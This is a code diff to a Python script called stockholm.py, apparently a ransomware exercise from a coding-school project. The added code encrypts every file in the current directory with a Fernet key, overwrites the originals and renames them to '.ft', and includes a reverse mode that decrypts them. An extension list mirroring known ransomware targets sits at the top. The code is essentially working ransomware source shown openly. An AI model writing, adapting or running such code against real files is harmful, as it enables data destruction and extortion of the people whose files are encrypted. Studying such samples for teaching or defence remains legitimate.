@@ -2,6 +2,7 @@ import argparse
 import os
 import glob
 import requests
+from cryptography.fernet import Fernet
 
 extensions = (
     '.jpg', '.rtf', '.doc', '.js', '.sch', '.3dm', '.jsp', '.sh', '.3ds', '.key',
@@ -33,17 +34,58 @@ def args_parser() ->  argparse.Namespace:
     args = parser.parse_args()
     return args
 
+def encrypt(allfiles, args):
+    # Recuperer la cle de chiffrement
+    with open("key.key", mode='rb') as filekey:
+        key = filekey.read()
+    for file in allfiles:
+        # Recuperer le contenu du fichier a chiffrer
+        with open(file, mode='rb') as fileRead:
+            content = fileRead.read()
+        # Chiffrer le contenu du fichier
+        fernet = Fernet(key)
+        encrypt_data = fernet.encrypt(content)
+        # Reecrire le contenu chiffrer dans le fichier
+        if args.silent == False:
+            print("encrypt:", file)
+        with open(file, mode='wb') as fileWrite:
+            fileWrite.write(encrypt_data)
+        # Changer le nom du fichier
+        filename = os.path.splitext(file)[0]
+        if '.ft' not in file:
+            os.rename(file, filename + '.ft')
+
+def decrypt(keyfile):
+    with open(keyfile, mode='rb') as decryptfile:
+        key = decryptfile.read()
+    for file in os.listdir():
+        if os.path.splitext(file)[1] == '.ft':
+            with open(file, mode='rb') as fileRead:
+                content = fileRead.read()
+            fernet = Fernet(key)
+            decrypt_data = fernet.decrypt(content)
+            print(decrypt_data)
+            with open(file, mode='wb') as fileWrite:
+                fileWrite.write(decrypt_data)
 
 def main():
     args = args_parser()
     if args.version:
         print("version: 1.1")
+    elif args.reverse:
+        try:
+            decrypt(keyfile=args.reverse)
+        except Exception as e:
+            print(e)
     else:
-        allfiles = []
-        for file in os.listdir():
-            if file != "stockholm.py" and file != "Makefile" and file != "README.md":
-                print(file)
-            # if file.endswith(extensions):
+        try:
+            allfiles = []
+            for file in os.listdir():
+                if file != "stockholm.py" and file != "Makefile" and file != "README.md" and file != "key.py" and file != "key.key" and file != "create_files.py":
+                    allfiles.append(file)
+            encrypt(allfiles=allfiles, args=args)
+        except Exception as e:
+            print(e)
 
 if __name__ == '__main__':
     main()
